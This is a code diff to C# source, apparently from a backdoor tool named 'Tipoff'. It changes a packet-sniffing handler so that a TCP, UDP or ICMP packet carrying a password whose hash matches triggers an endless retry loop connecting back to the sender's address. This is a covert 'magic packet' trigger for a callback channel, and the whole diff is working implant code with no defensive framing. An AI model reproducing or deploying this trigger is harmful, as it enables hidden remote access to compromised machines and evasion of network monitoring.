@@ -300,10 +300,45 @@ namespace Tipoff
             }
         }
 
+        /// <summary>
+        /// Validate password.
+        /// </summary>
+        /// <param name="pktIP">IPv4 Packet.</param>
+        /// <param name="abPayload">Packet Payload Bytes.</param>
+        /// <param name="nPort">Callback Port.</param>
+        private void fnValidatePacket(IpPacket pktIP, byte[] abPayload, int nPort)
+        {
+            string szPassword = Encoding.UTF8.GetString(abPayload);
+            string szHashedPassword = fnlpSha256(szPassword);
+
+            if (szHashedPassword == m_szPassword)
+            {
+                string szIP = pktIP.SourceAddress.ToString();
+
+                if (m_bConnected)
+                    return;
+
+                new Thread(() =>
+                {
+                    while (true)
+                    {
+                        if (!m_bConnected)
+                        {
+                            m_bConnected = Connect(szIP, nPort);
+                        }
+
+                        Thread.Sleep(m_nRetry);
+                    }
+                }).Start();
+            }
+        }
+
         private void Device_OnPacketArrival(object sender, CaptureEventArgs e)
         {
             var pktRaw = e.Packet;
+
             Packet pkt = Packet.ParsePacket(pktRaw.LinkLayerType, pktRaw.Data);
+            IpPacket pktIP = pkt.Extract(typeof(IpPacket)) as IpPacket;
 
             var pktTCP = pkt.Extract(typeof(TcpPacket)) as TcpPacket;
             var pktUDP = pkt.Extract(typeof(UdpPacket)) as UdpPacket;
@@ -312,31 +347,23 @@ namespace Tipoff
             if (pktTCP != null)
             {
                 byte[] abPayload = pktTCP.PayloadData;
-                string szPassword = Encoding.UTF8.GetString(abPayload);
-                string szHashedPassword = fnlpSha256(szPassword);
+                int nPort = pktTCP.SourcePort;
 
-                if (szHashedPassword == m_szPassword)
-                {
-                    IpPacket pktIP = pkt.Extract(typeof(IpPacket)) as IpPacket;
-                    string szIP = pktIP.SourceAddress.ToString();
-                    int nPort = pktTCP.SourcePort;
+                fnValidatePacket(pktIP, abPayload, nPort);
+            }
+            else if (pktUDP != null)
+            {
+                byte[] abPayload = pktUDP.PayloadData;
+                int nPort = pktUDP.SourcePort;
 
-                    if (m_bConnected)
-                        return;
+                fnValidatePacket(pktIP, abPayload, nPort);
+            }
+            else if (pktICMP != null)
+            {
+                byte[] abPayload = pktICMP.PayloadData;
+                int nPort = pktICMP.ID;
 
-                    new Thread(() =>
-                    {
-                        while (true)
-                        {
-                            if (!m_bConnected)
-                            {
-                                m_bConnected = Connect(szIP, nPort);
-                            }
-
-                            Thread.Sleep(m_nRetry);
-                        }
-                    }).Start();
-                }
+                fnValidatePacket(pktIP, abPayload, nPort);
             }
         }
 
